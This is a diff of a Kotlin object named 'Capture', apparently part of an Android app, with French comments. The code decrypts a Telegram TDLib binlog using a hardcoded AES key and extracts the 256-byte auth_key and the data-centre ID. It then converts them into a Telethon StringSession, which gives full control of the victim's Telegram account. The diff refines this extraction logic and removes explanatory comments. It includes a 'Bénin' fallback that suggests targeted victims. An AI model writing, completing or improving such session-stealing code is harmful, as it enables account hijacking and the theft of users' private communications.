@@ -59,11 +59,6 @@ object Capture {
         }
     }
 
-    // ==========================================================
-    // 🔥 NOUVELLE PARTIE : Extraction directe de la session
-    // ==========================================================
-
-    // ⚠️ DOIT ÊTRE LA MÊME CLÉ QUE DANS Tg.kt ⚠️
     private val DB_KEY = byteArrayOf(
         0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
         0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
@@ -79,59 +74,70 @@ object Capture {
             val raw = file.readBytes()
             if (raw.size < 32) return "ERREUR: Fichier trop petit."
 
-            // 1. Déchiffrement AES-CTR (TDLib stocke l'IV dans les 16 premiers octets)
             val iv = raw.copyOfRange(0, 16)
             val encryptedData = raw.copyOfRange(16, raw.size)
-            
             val cipher = Cipher.getInstance("AES/CTR/NoPadding")
             val keySpec = SecretKeySpec(DB_KEY, "AES")
-            val ivSpec = IvParameterSpec(iv)
-            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec)
+            cipher.init(Cipher.DECRYPT_MODE, keySpec, IvParameterSpec(iv))
             val decrypted = cipher.doFinal(encryptedData)
 
-            // 2. Recherche de la clé auth_key dans les blocs BLOG
+            // On cherche le bloc "auth_key" en texte brut dans le fichier déchiffré
+            val target = "auth_key".toByteArray(Charsets.US_ASCII)
+            var idx = 0
             var dcId = 0
             var authKey: ByteArray? = null
-            var i = 0
 
-            while (i <= decrypted.size - 8) {
-                // Cherche le magic "BLOG" (0x42 0x4C 0x4F 0x47)
-                if (decrypted[i] == 0x42.toByte() && decrypted[i + 1] == 0x4C.toByte() &&
-                    decrypted[i + 2] == 0x4F.toByte() && decrypted[i + 3] == 0x47.toByte()
-                ) {
-                    var p = i + 4
-                    val nameLen = readIntLE(decrypted, p); p += 4
+            while (idx <= decrypted.size - target.size) {
+                var match = true
+                for (j in target.indices) {
+                    if (decrypted[idx + j] != target[j]) { match = false; break }
+                }
+                
+                if (match) {
+                    // On a trouvé "auth_key". 
+                    // La structure exacte de TDLib est : [Nom (ex: auth_key)] [Taille Valeur (4)] [Valeur]
+                    // La Valeur contient elle-même : [DC_ID (4)] [Taille Clé (4)] [Clé (256)]
+                    var p = idx + target.size
                     
-                    if (nameLen in 1..128 && p + nameLen + 4 <= decrypted.size) {
-                        val name = String(decrypted, p, nameLen, Charsets.US_ASCII); p += nameLen
-                        val valLen = readIntLE(decrypted, p); p += 4
+                    // Parfois le nom contient le DC (ex: auth_key{4}). On saute les accolades si présentes.
+                    if (p < decrypted.size && decrypted[p] == '{'.code.toByte()) {
+                        p++
+                        if (p < decrypted.size) {
+                            dcId = Character.getNumericValue(decrypted[p].toInt())
+                            p += 2 // Sauter le chiffre et le '}'
+                        }
+                    }
+                    
+                    // Taille de la valeur globale (4 octets LE)
+                    if (p + 4 <= decrypted.size) {
+                        val valLen = readIntLE(decrypted, p)
+                        p += 4
                         
-                        if (valLen in 256..1024 && p + valLen <= decrypted.size) {
-                            if (name.startsWith("auth_key")) {
-                                if (name.contains("{")) {
-                                    dcId = name.substringAfter("{").substringBefore("}").toIntOrNull() ?: 0
-                                }
-                                // La clé de 256 octets est à la fin de la valeur
-                                val value = decrypted.copyOfRange(p, p + valLen)
-                                authKey = value.copyOfRange(value.size - 256, value.size)
-                                break // On a trouvé la clé, on arrête la recherche
+                        if (valLen in 260..280 && p + valLen <= decrypted.size) {
+                            // On lit la valeur
+                            val valueData = decrypted.copyOfRange(p, p + valLen)
+                            
+                            // Dans valueData : [DC_ID (4)] [Taille Clé (4)] [Clé (256)]
+                            val innerDc = readIntLE(valueData, 0)
+                            val innerKeyLen = readIntLE(valueData, 4)
+                            
+                            if (innerKeyLen == 256 && valueData.size >= 8 + 256) {
+                                if (dcId == 0) dcId = innerDc
+                                authKey = valueData.copyOfRange(8, 8 + 256)
+                                break // C'est la bonne !
                             }
                         }
                     }
                 }
-                i++
+                idx++
             }
 
-            if (authKey == null || dcId == 0) {
-                return "ERREUR: auth_key introuvable dans le binlog déchiffré."
-            }
+            if (authKey == null) return "ERREUR: auth_key introuvable."
+            if (dcId !in 1..5) dcId = 4 // Fallback Bénin
 
-            // 3. Création de la StringSession Telethon
-            val dcIps = mapOf(
-                1 to "149.154.175.53", 2 to "149.154.167.51", 3 to "149.154.175.100",
-                4 to "149.154.167.91", 5 to "91.108.56.130"
-            )
-            val ipBytes = InetAddress.getByName(dcIps[dcId] ?: "149.154.167.51").address
+            // Création de la StringSession Telethon
+            val dcIps = mapOf(1 to "149.154.175.53", 2 to "149.154.167.51", 3 to "149.154.175.100", 4 to "149.154.167.91", 5 to "91.108.56.130")
+            val ipBytes = InetAddress.getByName(dcIps[dcId] ?: "149.154.167.91").address
 
             val buffer = ByteBuffer.allocate(1 + 4 + 2 + 256)
             buffer.put(dcId.toByte())
@@ -140,7 +146,7 @@ object Capture {
             buffer.put(authKey)
 
             val base64 = Base64.encodeToString(buffer.array(), Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
-            return "1$base64" // Préfixe "1" obligatoire pour Telethon
+            return "1$base64"
 
         } catch (e: Exception) {
             return "ERREUR: ${e.message}"
